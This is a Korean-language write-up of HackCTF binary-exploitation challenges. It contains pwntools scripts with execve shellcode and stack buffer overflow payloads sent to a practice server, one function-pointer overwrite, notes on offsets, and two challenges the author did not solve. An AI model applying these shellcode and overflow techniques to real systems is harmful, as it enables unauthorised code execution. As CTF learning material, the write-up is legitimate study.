# HACKCTF  
## X64 Simple Size Bof  
~~~python
from pwn import *

r= remote("ctf.j0n9hyun.xyz",3005)

shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

r.recvuntil("buf: ")
buf =int(r.recv(14),16)
payload= shellcode +'A'*27937+p64(buf)

r.sendline(payload)
r.interactive()
~~~
이 문제의 코드를 아이다로 확인하면 buf의 주소를 준다.
그리고 버퍼인 v4의 크기는 0x6d30즉 27952이다.
그리고 실행시켜보면 buf의 주소는 유동적으로 바뀐다.
따라서 실행시킨 후 얻은 buf 주소를 사용해서 shellcode를 실행시킨다.
shellcode(23) | dummy(27937) | buf(14) 형태의 payload로 shell을 실행시켰는데
여기서 27952 - 14 = 27938이라 처음에 dummy를 27938 만큼 넣었는데  eof 값이 들어가서
크기 하나를 줄이게 되었다.
## Simple Overflow 2  
~~~python
from pwn import *

r= remote("ctf.j0n9hyun.xyz",3006)

shellcode="\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

nop ='a'*0x5c
r.sendlineafter("Data : ","ROY")
buf = int(r.recv(10),16)
r.send('y')
payload = shellcode + nop + p32(buf)
r.sendline(payload)
r.interactive()
r.close()
~~~
아이다로 코드를 열어봤는데 이건 ㅋㅋㅋ 겁나 복잡하다.
우선 s의 사이즈가 0x88이라는 것을 얻었다. 32bit이므로 sfp는 0x04이다.
시스템을 돌려보니 16자리 수마다 저장을 하고 BUF 주소를 준 다음 y n으로 반복할지를 결정하는 것을 볼 수 있다.
따라서 payload는 s(0x88)|sfp(0x04)|ret(0x04)로 짜준다.
프로그램을 두번 돌려서 첫번째 돌릴 때 얻은 buf 주소로 payload를 보내주어 shell을 얻는다.
이해 안 되서 롸업 참고했습니다.
## offset 
~~~python
from pwn import *

r= remote("ctf.j0n9hyun.xyz",3007)
flag= 0x000006d8
r.recvuntil("Which function would you like to call?\n")
payload = 'A'*30+p32(flag)
r.sendline(payload)
r.interactive()
~~~
nc를 통해 실행시켜보면 which function would you like to call?이라는 문구가 나온다.
다음 ida를 통해 열어보면 main 함수를 본 다음 print_flag를 확인가능하다.
앞에서 얘기한 function은 요놈이구나 싶다.
select_func 함수에서 call 되는 함수가 v3인데 따라서 v3의 주소를 print_flag의 주소를 덮어써야 한다.
따라서 dummy(30) | 0x000006d8로 payload를 구성시켜주면 된다.
remote 함수를 통해 which function would you like to call?이 나올 때까지 받아준 후
더미와 print_flag의 주소를 전달하는 코드를 통해 shell을 얻는다.
비교적 간단히 풀려서 좋닿ㅎㅎ
## BOF PIE  
nc로 3008에 연결시켜보니 내가 jon9hyun을 아는지 물어보고
j0n9hyun의 주소값을 주는 것을 확인했다.
몇번 돌려보니 역시나 주소값은 계속 변했다.
ida로 열어봤더니 welcome()을 실행하는 것을 알 수 있었고
위에서 변한다고 했던 주소값은 welcome의 주소임을 알 수 있었다.
그리고 j0n9hyun라는 함수에서 fopen()으로 flag를 보여주는 것을 확인했다.
fopen("flag","r"): "r" 즉 모드 인자에 의해 입출력 작업이 가능한지를 정하고 "flag" 인자에서 지정한 파일을 연다.
풀다보니 pie의 특성을 여기서 어떻게 해결할지 감이 잡히지 않아 우선 다음 문제들을 먼저 풀고
풀어봐야겠다.
## YES OR NO
**풀지 못했습니다.**
